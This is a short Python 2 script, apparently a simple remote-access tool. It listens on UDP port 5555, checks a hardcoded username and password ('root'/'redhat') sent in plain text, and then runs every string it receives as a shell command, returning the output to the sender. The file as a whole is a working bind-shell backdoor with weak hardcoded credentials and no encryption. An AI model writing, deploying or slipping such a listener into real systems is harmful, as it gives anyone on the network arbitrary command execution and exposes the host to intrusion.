#! usr/bin/python2
import socket,commands,sys,os,time

x=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
x.bind(("",5555))
username=x.recvfrom(100)
password=x.recvfrom(100)

if username[0]=="root" and password[0]=="redhat" :
	x.sendto("connection established",(username[1]))
	while True:
		cmd=x.recvfrom(100)[0]
		output=commands.getoutput(cmd)
		x.sendto(output,username[1])
	
else :
	x.sendto("incorrect login...please try again",(username[1]))
